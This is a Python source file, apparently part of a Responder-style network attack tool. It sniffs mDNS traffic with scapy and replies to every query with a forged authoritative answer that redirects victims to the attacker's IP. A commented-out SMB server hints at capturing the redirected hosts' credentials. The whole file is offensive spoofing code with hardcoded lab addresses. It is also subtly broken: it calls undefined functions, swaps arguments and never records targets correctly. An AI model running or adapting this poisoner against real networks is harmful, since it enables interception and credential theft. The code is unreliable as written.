#!/usr/bin/env python
# -*- coding: utf-8 -*-


from scapy.all import *
import threading

# from server import startSMBServer
import time
from .poisoninfo import PoisonNetworkInfo
import argparse


class MDNS(PoisonNetworkInfo):
    def __init__(self, ip, ipv6, mac_address, iface):
        super().__init__(ip, ipv6, mac_address, iface)
        self._targets_used = []

    @property
    def targets_used(self):
        return self._targets_used

    def dns_packet_for_mdns(self, pkt, ip):
        return DNSRR(
            rrname=pkt[DNS].qd.qname,
            type="A",
            rclass="IN",
            ttl=120,
            rdlen=None,
            rdata=self.ip,
        )

    def mdns_checking_packets(self, pkt):
        if pkt.haslayer(DNS):
            response = Ether(dst=pkt[Ether].src, src=self.mac_address)
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_src = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_src = pkt[IPv6].src
        response /= UDP(sport="mdns", dport="mdns")
        response /= DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode="QUERY",
            aa=1,
            rd=0,
            rcode="ok",
            qdcount=0,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=None,
            an=self.dns_packet_for_mdns(pkt, self.ip),
            ns=None,
            ar=None,
        )
        if ip_src not in self.targets_used:
            print("Sendin packet to " + ip_src)
            sendp(response, verbose=False)
            self.targets_used.append(self.ip)

    def start_mdns_poisoning(self):
        # Port of mdns 5353
        print("Starting MDNSPoisoner...")
        sniff(
            filter="udp and port mdns",
            iface=self.iface,
            prn=self.mdns_checking_packets,
            store=0,
        )

    def cleaner(self):
        print("Empezando sleeper...")
        while True:
            time.sleep(3)
            self.targets_used.clear()


def startPoison():
    try:
        ipv6 = "fe80::20c:29ff:fe89:df69"
        ip = "192.168.253.135"
        ether = "00:0c:29:89:df:69"
        iface = "ens33"

        MDNSPoison = threading.Thread(target=mdnsPoison, args=(ipv6, ip, ether, iface))
        MDNSPoison.daemon = True
        MDNSPoison.start()
        # server = threading.Thread(target=startSMBServer)
        # server.daemon = True
        # server.start()
        sleeper = threading.Thread(target=cleaner)
        sleeper.daemon = True
        sleeper.start()
        # server.join()
        MDNSPoison.join()
        sleeper.join()
    except KeyboardInterrupt:
        print("Saliendo ...")
